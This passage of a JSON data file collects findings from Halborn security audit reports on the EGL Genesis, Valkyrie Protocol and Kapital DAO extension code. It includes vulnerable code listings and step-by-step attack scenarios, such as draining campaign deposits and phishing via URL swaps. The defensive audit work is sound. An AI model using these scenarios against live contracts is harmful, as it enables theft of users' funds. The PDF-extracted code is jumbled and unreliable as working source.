balance , now ); } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommend to put a require statement on the endGenesis function. Listing 14: EglGenesis.sol (Lines 147) 146 147 function endGenesis () public onlyOwner whenNotPaused { require ( canContribute , \" GENESIS : GENESIS_ENDED \" ); 24 148 149 150 151 152 canContribute = false ; ( bool success , ) = msg . sender . call { value : cumulativeBalance }( \"\" ); require ( success , \" GENESIS : CLOSE_FAILED \" ); emit GenesisEnded ( msg . sender , cumulativeBalance , address ( this ). balance , now ); } Remediation Plan: RISK ACCEPTED: In the opinion of the client, It is possible to call endGenesisfunction even if it doesnt hit the maxThreshold. The client wanted that flexibility so that even if the client dont hit their target ETH amount, they could still continue with Genesis if the amount they do have is satisfactory to the owner multisig. 25 ", "labels": ["Halborn", "EGL_Genesis", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "In the public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: We noticed the use of public functions in the following contract:  EglGenesis.sol  Listing 15: EglGenesis.sol (Lines ) 37 38 39 40 41 42 - EglGenesis . initialize ( address , uint256 ) ( contracts / EglGenesis . sol #103 -112) - EglGenesis . withdraw () ( contracts / EglGenesis . sol #117 -130) - EglGenesis . allowWithdraw () ( contracts / EglGenesis . sol #135 -141) - EglGenesis . endGenesis () ( contracts / EglGenesis . sol #146 -151) - EglGenesis . pauseGenesis () ( contracts / EglGenesis . sol #156 -158) - EglGenesis . unpauseGenesis () ( contracts / EglGenesis . sol #163 -165) Risk Level: Likelihood - 1 Impact - 2 26 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remediation Plan: SOLVED: The client declared public functions as an external. The necessary changes applied on the relevant functions. 27 ", "labels": ["Halborn", "EGL_Genesis", "Severity: Informational"]}, {"title": "BLOCK TIMESTAMP ALIAS USAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "During a manual static review, we noticed the use of now. The contract developers should be aware that his does not mean current time. now is an alias for block.timestamp. block.timestamp can be influenced by miners to a certain degree, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles. Code Location:  ./contracts/EglGenesis.sol Line #83 Listing 16: EglGenesis.sol (Lines 82) 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 receive () external payable whenNotPaused { require ( canContribute , \" GENESIS : GENESIS_ENDED \" ); require ( msg . value >= MIN_CONTRIBUTION_AMOUNT , \" GENESIS : INVALID_AMOUNT \" ); require ( contributors [ msg . sender ]. amount == 0 , \" GENESIS : ALREADY_CONTRIBUTED \"); contributorsList . push ( msg . sender ); cumulativeBalance = cumulativeBalance . add ( msg . value ); contributorsCount = contributorsCount . add (1) ; Contributor storage contributor = contributors [ msg . sender ]; contributor . amount = msg . value ; contributor . cumulativeBalance = cumulativeBalance ; contributor . idx = contributorsCount ; contributor . date = now ; if ( cumulativeBalance >= maxThreshold ) { canContribute = false ; emit ThresholdMet ( cumulativeBalance , now ); } 28 88 89 90 91 92 93 94 95 emit ContributionReceived ( msg . sender , contributor . amount , contributor . cumulativeBalance , contributor . idx , contributor . date ); } Risk Level: Likelihood - 1 Impact - 2 Recommendation: Use block.number instead of block.timestamp or now reduce the influence of miners. If possible, Its recommended to use Oracles. Remediation plan: NOT APPLICABLE: the EGL Team considers safe the usage of now because 900 seconds of drift from miners is preferable to other options. Calculating time from the block could be wrong if there is a fork or upgrade - timestamps are less vulnerable to a change in block duration that could Use of oracles would occur with Ethereum 2.0 upgrades or hard forks. create a dependency on the health of a third party service and potentially incur additional fees. 29 ", "labels": ["Halborn", "EGL_Genesis", "Severity: Informational"]}, {"title": "LACK OF VISIBILITY ON THE MAXTHRESHOLD VARIABLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "During the dynamic analysis, we noticed the visibility of uint private maxThreshold variable marked as a private. After an initializing phase, maxThreshold variable is not visible through functions. Code Location:  ./contracts/EglGenesis.sol Line #20 Listing 17: EglGenesis.sol (Lines 20) 20 uint private maxThreshold ; Risk Level: Likelihood - 1 Impact - 2 Recommendation: According to workflow, visibility. following code. EGL Team should decide about the variable As an example remediation, Halborn Team suggested the Listing 18: EglGenesis.sol (Lines 20) 20 function getMaxThreshold () external onlyOwner whenNotPaused returns ( uint ){ 21 22 } return maxThreshold ; 30 Remediation plan: RISK ACCEPTED: the EGL Team considers to declaring maxThreshold as a private. 31 3.10 SYMBOLIC EXECUTION SECURITY ASSESSMENT ", "labels": ["Halborn", "EGL_Genesis", "Severity: Informational"]}, {"title": "ARBITRARY EXECUTION MESSAGES LEAD TO STEALING ALL FUNDS FROM CAMPAIGNS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "participate and participate_qualify_result functions in contracts/cam- paign/src/executions.rs allow a creator to execute any message on behalf of the campaign contract. Consequently, a malicious creator can include an execution message for withdrawing all deposits from a campaign, i.e., stealing deposits from users that have participated in that campaign. The risk level for this finding increases because there are no restrictions to update execution messages to malicious ones when campaigns are ongoing, see HAL-08 for more details. A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Loop of messages to be executed without restrictions on behalf of the campaign contract using the participate function: Listing 1: contracts/campaign/src/executions.rs (Lines 787) 787 788 789 790 791 792 for execution in campaign_config . executions . iter () { response = response . add_message ( message_factories :: wasm_execute_bin ( & execution . contract , execution . msg . clone () , )); } 18 Loop of messages to be executed without restrictions on behalf of the campaign contract using the participate_qualify_result function: Listing 2: contracts/campaign/src/executions.rs (Lines 839) 836 837 838 839 840 841 842 843 844 845 if continue_option . can_execute () { let campaign_config = CampaignConfig :: load ( deps . storage ) ?; for execution in campaign_config . executions . iter () { response = response . add_message ( message_factories :: wasm_execute_bin ( & execution . contract , execution . msg . clone () , )); } } Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to remove all execution logic from the campaign con- tract. If it is not possible, update the logic in participate and participate_qualify_result functions to not allow transfers of tokens outside the campaign contract. Remediation plan: SOLVED: The issue was fixed in commit 1e1de2243655fa3f083dec248256651e48dbb83b. Valkyrie team removed the execution logic from the campaign contract and moved it to the qualifier contract, which is written by the campaign creator and should have zero balance. 19 ", "labels": ["Halborn", "Valkyrie_Protocol_CosmWasm", "Severity: Critical"]}, {"title": "WITHDRAWAL OF ARBITRARY PARTICIPATION REWARDS WITHOUT DEPOSITING COLLATERALS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When a campaign is activated and no one has deposited collaterals yet, an attacker can participate an undefined number of times without depositing any collateral. Later on, attacker will be able to withdraw his ille- gitimate participation rewards. in function This issue arises because, when a user participates, the internal require_collateral is triggered and will always return false if collateral amount is zero, i.e.: As a consequence, validation that user owns enough collateral balance will be bypassed and participation_count field for user will increase by one for each participation, without the need to deposit any collateral. no one has deposited collaterals yet. contracts/campaign/src/states.rs A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Listing 3: contracts/campaign/src/executions.rs (Lines 738) 738 739 740 741 742 743 744 745 if campaign_config . require_collateral () { let mut collateral = Collateral :: load_or_new ( deps . storage , & actor ) ?; let collateral_balance = collateral . balance ( env . block . height ) ?; if collateral_balance < campaign_config . collateral_amount { return Err ( ContractError :: Std ( StdError :: generic_err ( format! ( \" Insufficient collateral balance ( required : {} , 20 current : {}) \" , campaign_config . collateral_amount . to_string () , collateral_balance . to_string () , )))); } collateral . lock ( campaign_config . collateral_amount , env . block . height , campaign_config . collateral_lock_period ) ?; collateral . save ( deps . storage ) ?; 746 747 748 749 750 751 752 753 } Listing 4: contracts/campaign/src/states.rs (Lines 52) 51 pub fn require_collateral (& self ) -> bool { 52 self . collateral_denom . is_some () && !self . collateral_amount . is_zero () 53 } Risk Level: Likelihood - 5 Impact - 5 Recommendation: Update the logic of require_collateral function to handle correctly the cases where no one has yet deposited collaterals in campaigns. Remediation plan: PARTIALLY SOLVED: Commit 5b89ebd6767d031f168ad66dcba7a9fa23b25483 par- tially fixes the security issue by extending the require_collateral ver- ification even if collateral amount is zero. On the other hand, by design, this protocol accepts that users partici- pate in campaigns without depositing collaterals, which could lead that malicious users participate without restrictions and in unfair fashion 21 to earn rewards. The Valkyrie team decided to implement the following measures in commit b3586c8c869b16cdc4a4a1ed8c2d8f46d9531702 to partially reduce the attack surface:  Make qualifier mandatory, so creators can include additional secu-  Limit rity requirements in their campaigns. per participation collateral_denom is None. count the address up to 100 when It is highly recommended that Valkyrie documentation warns creators about the security risks of creating campaigns that do not require collaterals and the security requirements they should consider in their qualifier contracts. 22 ", "labels": ["Halborn", "Valkyrie_Protocol_CosmWasm", "Severity: Critical"]}, {"title": "DEPOSITS GET LOCKED IN CAMPAIGN IF COLLATERAL DENOM IS NOT SPECIFIED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When users call deposit_collateral function in contracts/campaign/src/ex- ecutions.rs for a campaign which collateral_denom has not been specified at instantiation time, the contract will receive the deposits as usual, without throwing any error message to users. However, for when users call withdraw_collateral function to withdraw their deposits from campaign contract, the function will throw an error message and deposits will get locked forever in contract. Code Location: Conditional expression in deposit_collateral function does not consider else case: reject operation if campaign_config.collateral_denom is None: Listing 5: contracts/campaign/src/executions.rs (Lines 1088) 1086 1087 1088 1089 1090 1091 1092 1093 1094 let campaign_config = CampaignConfig :: load ( deps . storage ) ?; if let Some ( collateral_denom ) = campaign_config . collateral_denom { if * send_denom ! = collateral_denom { return Err ( ContractError :: Std ( StdError :: generic_err ( \" Missing collateral denom \")) ); } } let mut campaign_state = CampaignState :: load ( deps . storage ) ?; 23 When users call withdraw_collateral function to withdraw their deposits, function will always throw a No collateral error message: Listing 6: contracts/campaign/src/executions.rs (Lines 1153,1154,1155) 1141 1142 1143 1144 1145 1146 1147 1148 1149 1150 1151 1152 1153 1154 if let Some ( denom ) = campaign_config . collateral_denom { let mut campaign_state = CampaignState :: load ( deps . storage ) ?; campaign_state . collateral_amount = campaign_state . collateral_amount . checked_sub ( amount ) ?; campaign_state . save ( deps . storage ) ?; response = response . add_message ( make_send_msg ( & deps . querier , denom , amount , & info . sender , ) ?) ; } else { return Err ( ContractError :: Std ( StdError :: generic_err ( \" No collateral \" )) ); 1155 } Risk Level: Likelihood - 4 Impact - 5 Recommendation: Update the logic in deposit_collateral function to reject deposits in campaigns which collateral_denom has not been specified. Remediation plan: SOLVED: The issue was fixed in commit e45c721568be661fc15d1dd20473ec54b61d1ca1. 24 ", "labels": ["Halborn", "Valkyrie_Protocol_CosmWasm", "Severity: High"]}, {"title": "CAMPAIGNS CAN HOST MALICIOUS URLS THAT HARM USERS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "a is with created campaign function function create_campaign from When with contracts/campaign_manager/src/executions.rs update_campaign_config contracts/campaign/src/exe- cutions.rs, creator can introduce a malicious external URL that fools users to be redirected to a phishing DApp that can steal their deposits. It is important to note that URLs will appear in official Valkyrie frontend, so legitimate users wont be aware whether those URLs are malicious or not. updated from or Attack scenario: 1. Malicious creator calls create_campaign function to create a campaign with a valid URL. 2. Malicious creator sends the address of the campaign to Valkyrie team, who publishes it in official Valkyrie frontend. 3. Malicious creator calls update_campaign_config function to update URL to a malicious one. 4. Users click a malicious URL that appears in Valkyrie frontend and are redirected to a phishing DApp. 5. Users interact with the phishing DApp and try to participate in the campaign, but their deposits are sent to a malicious address instead of to the actual campaign. 25 Code Location: Creator can send an arbitrary config_msg that contains a malicious URL when creating a new campaign: Listing 7: contracts/campaign_manager/src/executions.rs (Lines 199) 195 pub fn create_campaign ( 196 197 198 199 200 201 202 203 204 205 206 ) -> ContractResult < Response > { deps : DepsMut , env : Env , info : MessageInfo , config_msg : Binary , collateral_denom : Option < Denom >, collateral_amount : Option < Uint128 >, collateral_lock_period : Option < u64 >, qualifier : Option < String >, qualification_description : Option < String >, executions : Vec < ExecutionMsg >, Listing 8: contracts/campaign_manager/src/executions.rs (Lines 227) config . code_id , Some ( config . governance . clone () ) , to_binary (& CampaignInstantiateMsg { 218 let create_campaign_msg = message_factories :: wasm_instantiate ( 219 220 221 222 223 224 225 226 227 228 governance : config . governance . to_string () , fund_manager : config . fund_manager . to_string () , campaign_manager : env . contract . address . to_string () , admin : info . sender . to_string () , creator : info . sender . to_string () , config_msg , collateral_denom , Creator can even update URL to a malicious one for campaign when is in pending status: Listing 9: contracts/campaign/src/executions.rs (Lines 152) if let Some ( url ) = url . as_ref () { validate_url ( url ) ?; 143 144 145 26 146 147 148 149 150 151 152 153 154 } if !is_pending ( deps . storage )? { return Err ( ContractError :: Std ( StdError :: generic_err ( \" Only modifiable in pending status \" , ))); } campaign_config . url = url . clone () ; response = response . add_attribute (\" is_updated_url \" , \" true \" ); Risk Level: Likelihood - 4 Impact - 5 Recommendation: It is recommended that campaign_manager contract generates automatically URLs for created campaigns (e.g.,: https://app.valkyrieprotocol.com/ campaigns/terra1e9...7mpw) and allows users to participate in campaigns directly through Valkyrie frontend, without the need of external sites. Furthermore, creators shouldnt be able to update those URLs. Remediation plan: RISK ACCEPTED: The Valkyrie team accepted the risk for this finding. They also claimed that this is a critical part of the creators process and workflow when creating a campaign, so it must be necessary for the creators to input their link and the protocol must allow for flexibility. 27 ", "labels": ["Halborn", "Valkyrie_Protocol_CosmWasm", "Severity: High"]}, {"title": "BALANCE DOES NOT UPDATE WHEN USERS CLAIM REWARDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The claim_participation_reward and claim_referral_reward functions in contracts/campaign/src/executions.rs allow users to claim their rewards when they participate or promote campaigns. Every time these functions are called, they do not update total reward balance, which allows other users to participate in campaigns even if there are not enough rewards for them and affects all rewardable ecosystem of Valkyrie protocol. A proof of concept video showing how to exploit this security issue is included in the report. Code Location: After unlocking balance, total participation reward balance does not up- date when reward is claimed: Listing 10: contracts/campaign/src/executions.rs (Lines 654) 649 650 651 652 653 654 655 656 657 let mut campaign_state = CampaignState :: load ( deps . storage ) ?; let reward_amount = participation . participation_reward_amount ; participation . participation_reward_amount = Uint128 :: zero () ; campaign_state . unlock_balance (& reward_config . participation_reward_denom , & reward_amount ) ?; participation . save ( deps . storage ) ?; campaign_state . save ( deps . storage ) ?; 28 After unlocking balance, total referral reward balance does not update when reward is claimed: Listing 11: contracts/campaign/src/executions.rs (Lines 695) 690 691 692 693 694 695 696 697 698 699 700 701 let mut campaign_state = CampaignState :: load ( deps . storage ) ?; let reward_amount = participation . referral_reward_amount ; participation . referral_reward_amount = Uint128 :: zero () ; campaign_state . unlock_balance ( & cw20 :: Denom :: Cw20 ( reward_config . referral_reward_token . clone () ) , & reward_amount , ) ?; participation . save ( deps . storage ) ?; campaign_state . save ( deps . storage ) ?; Risk Level: Likelihood - 5 Impact - 4 Recommendation: Fix the logic in claim_participation_reward and claim_referral_reward functions to update total balance when rewards are claimed. Remediation plan: SOLVED: The issue was fixed in commit 397af636356390334af89a68f93f8d0340124e61. The Valkyrie team also discovered this security issue while a security audit was in progress and solved it timely. 29 ", "labels": ["Halborn", "Valkyrie_Protocol_CosmWasm", "Severity: High"]}, {"title": "POSSIBILITY TO TRANSFER AN ARBITRARY AMOUNT OF VKR TOKENS FROM DISTRIBUTOR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The transfer function in contracts/distributor/src/executions.rs allows an admin (Valkyrie team) to transfer an arbitrary amount of VKR tokens from distributor contract to a potentially malicious external account. The maximum amount of VKR tokens to transfer depends on unlocked balance. However, admin can call update_distribution function to unlock all balance by updating start_height (see HAL-13 finding). According to Valkyrie documentation, this contract can concentrate up to 40% of total supply of VKR tokens. Attack scenario: 1. Malicious (or compromised) admin calls update_distribution function with start_height = <any_value_greater_than_current_block_height> and amount = 0. 2. As a consequence of Step 1, the aforementioned function will unlock all balance in contract. 3. Malicious (or compromised) admin calls transfer function to totally withdraw VKR tokens from distributor contract. 4. There wont be more VKR tokens to distribute to lp_staking and governance contracts anymore. 30 Code Location: Listing 12: contracts/distributor/src/executions.rs (Lines 305) 300 301 302 303 304 305 306 307 308 309 // Execute let mut response = make_response ( \" transfer \"); response = response . add_message ( message_factories :: wasm_execute ( & config . managing_token , & Cw20ExecuteMsg :: Transfer { recipient : deps . api . addr_validate (& recipient ) ?. to_string () , amount , }, )); Risk Level: Likelihood - 3 Impact - 5 Recommendation: If not used, it is recommended to totally remove transfer function to avoid rug-pull related attacks. Remediation plan: SOLVED: The issue was fixed in commit 9cb490064cdf6f1d37b2373644d355aaec9f2d8f. 31 ", "labels": ["Halborn", "Valkyrie_Protocol_CosmWasm", "Severity: High"]}, {"title": "USERS CAN PARTICIPATE IN CAMPAIGNS EVEN IF THERE ARE NOT ENOUGH REWARDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When a campaign is activated and its creator has not deposited partici- pation / referral rewards yet, users are allowed to participate in the campaign, even if there is no balance for rewards distribution. As a consequence, unless campaign creator deposits all rewards accrued unex- pectedly in campaign, some users will not be able to claim their rewards. This issue arises because, when a user participates, the internal is validate_balance triggered and will always return Ok(()) if balance has no elements, i.e.: if creator has not deposited rewards yet. contracts/campaign/src/states.rs function in A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Listing 13: contracts/campaign/src/states.rs (Lines 157,165) for ( denom , balance ) in self . balances . iter () { 156 pub fn validate_balance (& self ) -> StdResult <() > { 157 158 159 160 161 if * balance < locked_balance { let locked_balance = self . locked_balance ( denom ); return Err ( StdError :: generic_err ( \" locked balance can ' t greater than balance \" )) ; 162 163 164 165 166 } } } Ok (() ) 32 Risk Level: Likelihood - 4 Impact - 4 Recommendation: Update the logic of validate_balance function to handle correctly the cases where creators have not yet deposited rewards in campaigns. Remediation plan: SOLVED: The issue was fixed in commit 1026b29b7cefc6a9e3af3800d2c1061718afe14d. 33 ", "labels": ["Halborn", "Valkyrie_Protocol_CosmWasm", "Severity: High"]}, {"title": "NO RESTRICTION TO UPDATE EXECUTION MESSAGES WHEN CAMPAIGNS ARE ONGOING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The update_campaign_config function in contracts/campaign/src/execu- tions.rs allows creators to update execution messages when campaigns are ongoing, i.e., last active height is different to None. This situation can produce the following consequences:  A malicious creator can update execution messages when a campaign is ongoing and force contract to transfer the whole collateral deposits to him, i.e., stealing deposits from users that have participated in that campaign. See HAL-01 for more details regarding the exploiting of this vulnerability.  Users who participate in campaigns may be unaware that the execution messages have changed to malicious or disadvantageous ones and, of course, cannot react timely if the change made is not in the best interest of them. Code Location: Listing 14: contracts/campaign/src/executions.rs 190 191 192 193 194 195 if let Some ( executions ) = executions . as_mut () { executions . sort_by_key (| e | e . order ); campaign_config . executions = executions . iter () . map (| e | Execution :: from ( deps . api , e)) . collect :: < StdResult < Vec < Execution > > >() ?; response = response . add_attribute (\" is_updated_executions \" , \" true \" ); 196 } 34 Risk Level: Likelihood - 5 Impact - 3 Recommendation: Update the logic of update_campaign_config function to restrict the mod- ification of execution messages when campaigns are ongoing. Remediation plan: SOLVED: The issue was fixed in commit 1e1de2243655fa3f083dec248256651e48dbb83b. The Valkyrie team updated the logic of update_campaign_config function to not allow changes in execution messages. 35 ", "labels": ["Halborn", "Valkyrie_Protocol_CosmWasm", "Severity: High"]}, {"title": "FUNCTION TO UPDATE STAKING CONFIG DOES NOT WORK PROPERLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "update_staking_config The contracts/governance/src/s- taking/executions.rs is not restricted to be called only by admin (Governance contract). Moreover, all changes made are not saved appropriately in contracts storage. function in As a consequence of malfunction of aforementioned function, admin will never be able to update distributor field for governance contract and could stop receiving rewards adequately. Code Location: Listing 15: contracts/governance/src/staking/executions.rs deps : DepsMut , _env : Env , _info : MessageInfo , distributor : Option < String >, 36 pub fn update_staking_config ( 37 38 39 40 41 ) -> ContractResult < Response > { 42 43 44 45 46 47 48 // Execute let mut response = make_response ( \" update_staking_config \" ); let mut config = StakingConfig :: load ( deps . storage ) ?; if let Some ( distributor ) = distributor { config . distributor = Some ( deps . api . addr_validate ( distributor . as_str () ) ?) ; response = response . add_attribute ( \" is_updated_distributor \" , \" true \" ); } Ok ( response ) 49 50 51 52 36 Risk Level: Likelihood - 5 Impact - 2 Recommendation: Update the logic in update_staking_config function to saves all changes appropriately in contracts storage. Also, restrict access to a function in such a way that can only be called by admin. Remediation plan: SOLVED: The issue was fixed in commit 753da9627f9dad0ee089415937178a33ebe4796d. 37 3.10 (HAL-10) COLLUDED STAKERS CAN TRANSFER VKR TOKENS OUTSIDE GOVERNANCE CONTRACT - MEDIUM ", "labels": ["Halborn", "Valkyrie_Protocol_CosmWasm", "Severity: Informational"]}, {"title": "UNCHECKED ORIGIN IN POSTMESSAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest_Report_Halborn_Final.pdf", "body": "During the audit, Halborn discovered that the extension does not check the source of MessageEvents in its EventListeners. This (considering that it is in Playground Labs plans to whitelist the use of the extension for all domains) presents the danger that any website could send message events to the Content Script of the extension. In particular, each webpage into which the extensions Content Script can be injected, can send message events to the Background Script with the following payload.message:  login  logout  confirm_signature  reject_signature  confirm_transaction  reject_transaction and the following payload.method:  eth_sendTransaction  eth_signTypedData_v4 This means that all websites where the Content Script is injected can either log out the user from the extension or confirm/reject signatures and transactions that originated from other legitimate websites. 14 Code Location: Listing 1 1 REDACTED Screenshots/Videos: Confirming signatures generated on another website Logging the user out of the Kapital DAO Extension from a website CVSS Vector:  AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:H Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended while progressively allowing more websites to be injected with the extensions Content Script to add origin checks in the Event Listeners and avoid whitelisting all domains in the check. Instead, it is recommended to have a list of trusted origins and compare the event origin against them: Listing 2: Checks for a valid message origin in the Content Script \" https :// game . cryptounicorns . fun / \" , \" https :// game . cryptopterodactyls . fun /\" 1 var trusted_origins = [ 2 3 4 ]; 5 6 if ( trusted_origins . includes ( event . origin ) ) { 15 do_stuff ( event ); 7 8 } Listing 3: Checks for a valid message origin in the Background Script 1 chrome . runtime . onMessage . addListener ( async ( payload , sender ,  sendResponse ) => { 2 3 4 var messageOrigin = sender . origin ; if ( messageOrigin == ...) { handleRequest ( payload , sender , sendResponse ) Additionally, it is recommended to verify using the message origin that login/logout/confirm/reject messages come from the correct origin, (in this case chrome-extension://ID) to avoid malicious websites from the logging in/out of the user and from the confirmation of their signatures and transactions. Figure 1: A message from the extensions popup 16 Reference: Unchecked Origin in postMessage Remediation Plan: SOLVED: The Playground Labs team solved this issue by implementing the following fixes:  Checking the origin of each Message Event that the extension should emit: Commit ID: 27b021d00b6c5274f6bd71573cc52a0c05686720 17 ", "labels": ["Halborn", "Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest", "Severity: High"]}, {"title": "UNRESTRICTIVE/UNSECURE EXTENSION CONTENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest_Report_Halborn_Final.pdf", "body": "DAO Guild Service Kapital The non-restrictive/insecure Content-Security-Policy (CSP). The CSP cannot declare a default-src directive. directive untrusted sources are not loaded. resources extension malicious ensures browser that that has a declared This is a fallback undeclared, from Moreover, elements controlled by object-src are perhaps coincidentally considered legacy HTML elements and arent receiving new standardized features (such as the security attributes sandbox or allow for <iframe> ). Therefore, it is recommended to restrict this fetch-directive (e.g., explicitly set object-src none if possible). Lastly, the following directives, which do not inherit from the default -src directive, are not defined:  base-uri  form-action  frame-ancestors  plugin-types  report-uri  sandbox  reflected-xss  referrer 18 Figure 2: The default CSP the extension is using CVSS Vector:  AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to add the default-src 'none' directive to the CSP as a fallback. It is also recommended to set the object-src directive to none if possible, since the elements it controls are considered to be inherited, and to set missing directives that do not inherit from the default-src directive. 19 Reference: Secure Chrome extensions: CSP object-src directive best practices Remediation Plan: SOLVED: The Playground Labs team solved this issue by implementing the following fixes:  CSP update in manifest.json: Commit ID: 82e576964d9c0f19cf45b064b39762cb5d4d4f5f 20 ", "labels": ["Halborn", "Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest", "Severity: Low"]}, {"title": "DEPENDENCIES SHOULD BE PINNED TO EXACT VERSIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest_Report_Halborn_Final.pdf", "body": "The application contains some dependencies that are not pinned to an exact version, but are instead set to compatible version (x.x.x). This can potentially allow dependency attacks. Code Location: Listing 4 1 REDACTED CVSS Vector:  AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N Risk Level: Likelihood - 2 Impact - 2 Recommendation: Pinning dependencies to an exact version (=x.x.x) can reduce the chance of inadvertently introducing a malicious version of a dependency in the future. Remediation Plan: SOLVED: The Playground Labs team solved this issue by implementing the following fixes: 21  Pinning all dependencies to exact versions: Commit ID: 0cadfbbc5026922f6c2cefbfe602f073cc2fd076 22 ", "labels": ["Halborn", "Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest", "Severity: Low"]}, {"title": "APPLICATION ERROR MAY DISCLOSE SENSITIVE TECHNOLOGY INFORMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest_Report_Halborn_Final.pdf", "body": "During the audit, Halborn discovered that the application at dev-api. kapital.gg generates an error message that includes sensitive information about its environment, technologies, or associated data. It specifically hints at the fact that the back-end server is possibly using Python and the pydantic library. Screenshots/Videos: Figure 3: In the above code, in case the game parameter is not a valid enumeration member, the server will throw a type_error.enum error. CVSS Vector:  AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N 23 Risk Level: Likelihood - 1 Impact - 2 Recommendation: It is recommended to always return a generic error message to end users, to avoid any possibility of disclosing potentially critical information about the application-related technologies or environment. The returned error messages can comply with the OpenAPI specification and still hide information about the technology used in the back-end. They can still be able to allow integrations and to facilitate third-party developers needs. Reference: CWE-209: Generation of Error Message Containing Sensitive Information Remediation Plan: ACKNOWLEDGED: The Playground Labs team acknowledged this finding. 24 ", "labels": ["Halborn", "Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest", "Severity: Informational"]}, {"title": "CONTENT SCRIPT DOES NOT CHECK FOR SYNTHETICALLY GENERATED EVENTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest_Report_Halborn_Final.pdf", "body": "During the assessment, Halborn observed that the extension does not check Specifically, the on: if the events it listens for are trustworthy. click events that call the handleConfirm() and handleReject functions in Confirm.svelte do not perform this check. The isTrusted property states if the event was generated purely from user actions and not synthetically created by an attacker. The severity of this vulnerability has been downgraded to INFORMATIONAL since the attack vector would require someone to already be able to perform an XSS attack on the extension popup window. However, it is good practice to always perform this check on events. This can add security in the future when the extension listens for events generated by the website. As good coding practice, MessageEvents should also check this property, and they are listed below. Proof of Concept: The following Svelte snippet exposes two functions, each called by a button. The first button directly calls handleClick() and the second calls triggerClick(), which synthetically clicks the first button, which in turn calls handleClick(): Listing 5: Trusted/untrusted events handling 1 < script > 2 3 4 5 6 } function handleClick ( event ) { console . log ( ' handleClick called '); console . log ( event . isTrusted ) alert ( ' clicked ') 25 console . log ( ' triggerClick called first '); var btn = document . getElementById ( \" myBtn \" ); function triggerClick () { btn . click () ; } 7 8 9 10 11 12 13 </ script > 14 15 < button id = \" myBtn \" on : click ={ handleClick }> 16 17 </ button > 18 < hr /> 19 < button on : click ={ triggerClick }> 20 21 </ button > Click me Untrusted Click me Trusted The image below shows the isTrusted property of each event: 26 Figure 4: A trusted and an 